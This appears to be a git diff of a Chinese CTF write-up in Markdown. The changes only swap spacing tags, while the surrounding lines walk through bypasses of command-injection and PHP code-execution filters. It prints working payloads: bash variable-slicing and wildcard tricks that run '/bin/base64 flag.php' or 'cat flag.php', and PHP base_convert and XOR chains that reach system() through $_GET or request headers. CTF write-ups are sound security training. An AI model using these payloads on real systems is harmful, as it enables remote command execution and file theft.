 ${PATH:${#HOME}:${#SHLVL}}${PATH:${#RANDOM}:${#SHLVL}} ?${PATH:${#RANDOM}:${#SHLVL}}??.???
 ```
 
-&nbsp;
+<br>
 
 ---
 
@@ -3562,13 +3562,13 @@ ${PATH:${#HOME}:${#SHLVL}}${PATH:${#RANDOM}:${#SHLVL}} ?${PATH:${#RANDOM}:${#SHL
 
 **测试后发现，在上一题的基础上过滤了 `PATH`**
 
-&nbsp;
+<br>
 
 **此时要想构造 `nl` 就比较难了，尝试用 `/bin/base64`**
 
 **目标：构造 `/bin/base64 flag.php` 即 `/???/?????4 ????.???`**
 
-&nbsp;
+<br>
 
 **于是，剩下的工作就是利用内置变量替换 `/` 和`4`**
 
@@ -3590,7 +3590,7 @@ ${PWD:0:1}???${PWD:0:1}?????${#RANDOM} ????.???
 ${PWD:${#}:${#SHLVL}}???${PWD:${#}:${#SHLVL}?????${#RANDOM} ????.???
 ```
 
-&nbsp;
+<br>
 
 **最终的payload （由于使用了 `RANDOM` ，所以需要多试几次）**   
 
@@ -3607,11 +3607,11 @@ ${PWD::${##}}???${PWD::${##}}?????${#RANDOM} ????.???
 
 <img src="\images\article_images\image-20250505154315931.png" alt="image-20250505154315931" style="zoom: 25%;" />
 
-&nbsp;
+<br>
 
 <img src="\images\article_images\image-20250505154301006.png" alt="image-20250505154301006" style="zoom:33%;" />
 
-&nbsp;
+<br>
 
 **其他payload**
 
@@ -3625,7 +3625,7 @@ ${###}  : 0
 ${####} : 0
 ```
 
-&nbsp;
+<br>
 
 **可以尝试 `/bin/cat flag.php`**
 
@@ -3653,7 +3653,7 @@ ${####} : 0
 (或者：${PWD:${#}:${#SHLVL}}???${PWD:${#}:${#SHLVL}}?${USER:~A}? ????.???     PS:这个乱码>___<       乱码>___<)
 ```
 
-&nbsp;
+<br>
 
 
 
@@ -3684,7 +3684,7 @@ ${PWD::${##}}???${PWD::${##}}${PWD:${#IFS}:${##}}?? ????.???
 ${PWD::${#?}}???${PWD::${#?}}${PWD:${#IFS}:${#?}}?? ????.???
 ```
 
-&nbsp;
+<br>
 
 ---
 
@@ -3714,7 +3714,7 @@ if(isset($_POST['code'])){
 
 **给黑名单了！同时有限制长度**
 
-&nbsp;
+<br>
 
 **payload**
 
@@ -3732,7 +3732,7 @@ ${PWD::${#?}}???${PWD::${#?}}${PWD:${#IFS}:${#?}}?? ????.???
 
 <img src="\images\article_images\image-20250505162457958.png" alt="image-20250505162457958" style="zoom: 25%;" />
 
-&nbsp;
+<br>
 
 ---
 
@@ -3762,7 +3762,7 @@ if(isset($_POST['code'])){
 
 **与上一题相比，只有我们用到的 `SHLVL` 被过滤了（上一题也可以不用 `SHLVL`）**
 
-&nbsp;
+<br>
 
 ```bash
 一些 bash 内置变量
@@ -3790,11 +3790,11 @@ ${PWD::${##}}???${PWD::${##}}${PWD:${#IFS}:${##}}?? ????.???
 ${PWD::${#?}}???${PWD::${#?}}${PWD:${#IFS}:${#?}}?? ????.???
 ```
 
-&nbsp;
+<br>
 
 <img src="\images\article_images\image-20250505165849611.png" alt="image-20250505165849611" style="zoom: 33%;" />
 
-&nbsp;
+<br>
 
 ---
 
@@ -3824,11 +3824,11 @@ if(isset($_POST['code'])){
 
 **过滤了 `PWD`、`#`、`USER`，白名单了 `HOME`**
 
-&nbsp;
+<br>
 
 **`$?` 表示上一条命令执行结束后的传回值。通常 `0`  代表执行成功，`非0 ` 代表执行有误**
 
-&nbsp;
+<br>
 
 **几种报错及对应的返回值**
 
@@ -3847,7 +3847,7 @@ if(isset($_POST['code'])){
 
 **（所以利用 `<A` 的报错就能返回值1）**
 
-&nbsp;
+<br>
 
 <img src="\images\article_images\image-20250505173823524.png" alt="image-20250505173823524" style="zoom:50%;" />
 
@@ -3869,7 +3869,7 @@ user@LAPTOP-HHK0H1KL:~$ $?
 0: command not found
 ```
 
-&nbsp;
+<br>
 
 ```bash
 目标：构造 /bin/base64 flag.php
@@ -3884,11 +3884,11 @@ user@LAPTOP-HHK0H1KL:~$ $?
 <A;${HOME:${A}:$?}???${HOME:${A}:$?}?????${RANDOM::$?} ????.???
 ```
 
-&nbsp;
+<br>
 
 <img src="\images\article_images\image-20250505175440431.png" alt="image-20250505175440431" style="zoom: 25%;" />
 
-&nbsp;
+<br>
 
 ---
 
@@ -3941,7 +3941,7 @@ if(!isset($_GET['c'])){
 
 **白名单中数学函数分两种利用方法，==进制转换== 和 ==异或==，旨在调用能返回字符串的数学函数达到命令执行的目的。**
 
-&nbsp;
+<br>
 
 
 
@@ -3972,7 +3972,7 @@ hexdec ( int $number ) : string
 #把十六进制转换为十进制。返回与 hex_string 参数所表示的十六进制数等值的的十进制数
 ```
 
-&nbsp;
+<br>
 
 **十六进制的字母范围只有 a-f ，显然是不符合我们构造的要求，而三十六进制字母范围正好为 a-z 。**
 
@@ -3987,7 +3987,7 @@ base_convert("cat",36,10);
 
 **这里，虽然可以构造纯字母字符串了，但进制转换显然不能返回  `.`  `/`  `*`  等特殊字符，而这就需要用到另一类运算函数。**
 
-&nbsp;
+<br>
 
 **如下**
 
@@ -4061,7 +4061,7 @@ echo "2" ^ 3;
 >
 >    ​                                                       **temp = a ^ b;   a = temp ^ a;   b = temp ^ b;**
 
-&nbsp;
+<br>
 
 **假设初始：**
 
@@ -4085,7 +4085,7 @@ a = B
 b = A
 ```
 
-&nbsp;
+<br>
 
 **接下来就是利用异或 构造例如 `   空格* ` 这样的特殊字符**
 
@@ -4099,7 +4099,7 @@ b = A
 
 **则有`k` ^ `i` ^ `某` = `空格*`**
 
-&nbsp;
+<br>
 
 **于是我们可以在白名单函数里面寻找 `k` 和 `i` ，使 `k` 和 `i` 能与 `空格*` 异或得到 `一个值`  （ 且这个值`能使用数学函数 dechex 得到`）**
 
@@ -4119,13 +4119,13 @@ foreach ($whitelist as $i) {
 
 <img src="\images\article_images\image-20250505213848722.png" alt="image-20250505213848722" style="zoom:33%;" />
 
-&nbsp;
+<br>
 
 **有很多符合条件的值**
 
 **任取一例 `10^pi^asinh` 的结果为 `空格*`**
 
-&nbsp;
+<br>
 
 **到这里一切都很明确了，目标：构造 `system('cat *')`**
 
@@ -4160,11 +4160,11 @@ base_convert(1751504350,10,36)(base_convert(15941,10,36).(dechex(16)^asinh^pi))
 
 <img src="\images\article_images\image-20250505212133503.png" alt="image-20250505212133503" style="zoom:80%;" />
 
-&nbsp;
+<br>
 
 <img src="\images\article_images\image-20250505212156945.png" alt="image-20250505212156945" style="zoom:80%;" />
 
-&nbsp;
+<br>
 
 **既然能异或出特殊字符，那么也当然能异或出字母，于是可以不使用进制转换来构造关键字，待看题解三**
 
@@ -4178,7 +4178,7 @@ base_convert(1751504350,10,36)(base_convert(15941,10,36).(dechex(16)^asinh^pi))
 
 
 
-&nbsp;
+<br>
 
 **==题解二==**
 
@@ -4229,7 +4229,7 @@ echo $A;
 >
 > 
 
-&nbsp;
+<br>
 
 **因为黑名单字符过滤较多，我们也可以用 `_GET[]`  来传 `system` 之类的命令**
 
@@ -4249,7 +4249,7 @@ $_GET[a]($_GET[b])&a=system&b=tac flag.php
 
 **那么，其实，下面需要想办法构造的，仅仅只有    `_GET[]`**
 
-&nbsp;
+<br>
 
 **先对上面的payload做简单的替换      （变量名使用白名单里的函数）** 
 
@@ -4310,7 +4310,7 @@ $pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){pi}(($$pi){abs})&
 
 <img src="\images\article_images\image-20250506215444162.png" alt="image-20250506215444162" style="zoom:80%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -4340,7 +4340,7 @@ $_GET[a]($_GET[b])&a=system&b=tac flag.php
 $_GET{pi}($_GET{abs})&pi=system&abs=tac flag.php
 ```
 
-&nbsp;
+<br>
 
 **使用白名单里面的数学函数和数字异或生成 `_GET`**
 
@@ -4415,7 +4415,7 @@ $pi=(is_nan^(6).(4)).(tan^(1).(5));$pi=$$pi;$pi{1}($pi{2})&1=system&2=cat flag.p
 
 <img src="\images\article_images\image-20250507001315187.png" alt="image-20250507001315187" style="zoom:80%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -4425,11 +4425,11 @@ $pi=(is_nan^(6).(4)).(tan^(1).(5));$pi=$$pi;$pi{1}($pi{2})&1=system&2=cat flag.p
 
 **于是，可以利用 `getallheaders` 函数 获取当前请求中所有的 HTTP 请求头（headers）信息，并返回一个关联数组（即键值对数组），键是 header 名称，值是 header 的值。总之，就是获取全部 HTTP 请求头信息**
 
-&nbsp;
+<br>
 
 **目标，构造 `system(getallgeaders(){1})`**
 
-&nbsp;
+<br>
 
 **先对 `system` 和 `getallheaders` 进行进制转换**
 
@@ -4437,7 +4437,7 @@ $pi=(is_nan^(6).(4)).(tan^(1).(5));$pi=$$pi;$pi{1}($pi{2})&1=system&2=cat flag.p
 
 **对于 `getallheaders` 的进制转换，(经过尝试) 选择 `base29/30→base10` 都可以正常转换与还原**
 
-&nbsp;
+<br>
 
 **进制转换**
 
@@ -4478,8 +4478,8 @@ $pi=base_convert,$pi(1751504350,10,36)($pi(8768397090111664438,10,30)(){1});
 
 <img src="\images\article_images\image-20250509150552118.png" alt="image-20250509144841126" style="zoom:80%;" />
 
-&nbsp;
+<br>
 
 <img src="\images\article_images\image-20250509150853189.png" alt="image-20250509150853189" style="zoom:80%;" />
 
-&nbsp;
+<br>
